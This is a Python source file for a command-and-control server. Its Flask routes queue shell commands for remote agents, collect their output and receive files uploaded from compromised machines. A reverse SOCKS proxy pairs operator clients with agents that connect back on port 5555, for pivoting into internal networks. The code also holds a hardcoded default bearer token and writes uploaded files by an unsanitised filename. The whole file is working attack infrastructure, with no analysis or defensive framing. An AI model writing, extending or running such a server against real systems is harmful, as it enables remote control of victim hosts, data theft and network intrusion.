#!/usr/bin/env python3
from flask import Flask, request, jsonify, abort
import base64
import os
import socket
import threading
from functools import wraps

app = Flask(__name__)

# ===============================
# --- CONFIGURATION & GLOBALS ---
# ===============================

SERVER_TOKEN = os.getenv("SERVER_TOKEN", "Azerty112345678")

# The address on which the local SOCKS listener will bind.
# Default: 127.0.0.1 (local only). Set to 0.0.0.0 to accept remote clients.
SOCKS_BIND = os.getenv("SOCKS_BIND", "127.0.0.1")

commands_queue = []
results = {}

# ===============================
# --- AUTH DECORATOR ---
# ===============================

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            abort(401, description="Missing Bearer token")
        token = auth_header.split(" ")[1]
        if token != SERVER_TOKEN:
            abort(401, description="Invalid token")
        return f(*args, **kwargs)
    return decorated


# ===============================
# --- C2 ROUTES ---
# ===============================

@app.route("/submit_command", methods=["POST"])
@require_auth
def submit_command():
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400
    data = request.get_json()
    command_id = str(len(commands_queue) + 1)
    commands_queue.append({"id": command_id, "cmd": data["cmd"]})
    return jsonify({"id": command_id}), 200


@app.route("/command", methods=["GET"])
@require_auth
def get_command():
    if commands_queue:
        cmd = commands_queue.pop(0)
        return jsonify(cmd), 200
    return jsonify({"error": "No commands in queue"}), 404


@app.route("/submit_result", methods=["POST"])
@require_auth
def submit_result():
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400
    data = request.get_json()
    command_id = data["id"]

    if "fileName" in data:
        file_content = base64.b64decode(data["result"])
        file_path = os.path.join("received_files", data["fileName"])
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, "wb") as file:
            file.write(file_content)
        results[command_id] = f"File {data['fileName']} received successfully"
    else:
        results[command_id] = data["result"]

    return jsonify({"message": "Result received successfully"}), 200


@app.route("/result/<command_id>", methods=["GET"])
@require_auth
def get_result(command_id):
    if command_id in results:
        return jsonify({"id": command_id, "result": results[command_id]}), 200
    return jsonify({"error": "Result not found"}), 404


# ===============================
# --- REVERSE PROXY SECTION ---
# ===============================

def bridge_bidirectional(conn1, conn2):
    """
    Relay bytes bidirectionally between conn1 and conn2.
    Uses shutdown(SHUT_WR) on the destination when one side EOFs so the other side can
    finish reading; waits for both directions to complete, then closes both sockets.
    """
    def pipe(src, dst):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
        finally:
            try:
                # signal EOF to dst's read side
                dst.shutdown(socket.SHUT_WR)
            except Exception:
                pass

    t1 = threading.Thread(target=pipe, args=(conn1, conn2), daemon=True)
    t2 = threading.Thread(target=pipe, args=(conn2, conn1), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    try:
        conn1.close()
    except Exception:
        pass
    try:
        conn2.close()
    except Exception:
        pass


def handle_client(client_conn, agent_listener):
    """
    When a proxychains client connects to the SOCKS listener,
    wait for a new agent to connect on port 5555 and bridge them.
    """
    try:
        print("[*] Waiting for an agent to pair with local client...")
        agent_conn, agent_addr = agent_listener.accept()
        print(f"[+] Paired new agent from {agent_addr}")

        # Use the bidirectional bridge that signals EOFs without closing the other side prematurely
        threading.Thread(target=bridge_bidirectional, args=(client_conn, agent_conn), daemon=True).start()

    except Exception as e:
        print(f"[-] Bridge error: {e}")
        try:
            client_conn.close()
        except Exception:
            pass


def start_reverse_proxy(listen_port=1080, agent_port=5555):
    """
    Launch the reverse proxy service:
      - Listens on agent_port for incoming agent connections.
      - Listens on listen_port for local SOCKS clients.
      - Pairs one agent per SOCKS client.
    The bind address for the SOCKS listener can be set via SOCKS_BIND env var.
    """
    print(f"[+] Starting reverse proxy service")
    print(f"    • Local SOCKS listener: {SOCKS_BIND}:{listen_port}")
    print(f"    • Agent connection port: {agent_port}")

    # --- 1. Agent listener ---
    agent_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    agent_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    agent_listener.bind(("0.0.0.0", agent_port))  # accept agents from anywhere
    agent_listener.listen(5)
    print(f"[+] Waiting for agents on port {agent_port}...")

    # --- 2. Local SOCKS listener (bind address configurable) ---
    local_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    local_listener.bind((SOCKS_BIND, listen_port))
    local_listener.listen(5)
    print(f"[+] Local SOCKS listener active at {SOCKS_BIND}:{listen_port}")
    print(f"    Add this to /etc/proxychains4.conf: socks5 {SOCKS_BIND} {listen_port}")

    # --- 3. Accept SOCKS clients ---
    while True:
        client_conn, client_addr = local_listener.accept()
        print(f"[+] New local SOCKS client from {client_addr}")
        threading.Thread(target=handle_client, args=(client_conn, agent_listener), daemon=True).start()


# ===============================
# --- ENTRY POINT ---
# ===============================

if __name__ == "__main__":
    cert_file = "cert.pem"
    key_file = "key.pem"

    # Start reverse proxy thread
    threading.Thread(target=start_reverse_proxy, args=(1080, 5555), daemon=True).start()

    # Launch Flask API (C2 interface)
    if os.path.exists(cert_file) and os.path.exists(key_file):
        print("[+] Starting Flask C2 server with HTTPS...")
        app.run(host="0.0.0.0", port=5000, ssl_context=(cert_file, key_file))
    else:
        print("[-] Certificates not found, using HTTP (dev mode).")
        app.run(host="0.0.0.0", port=5000)

               
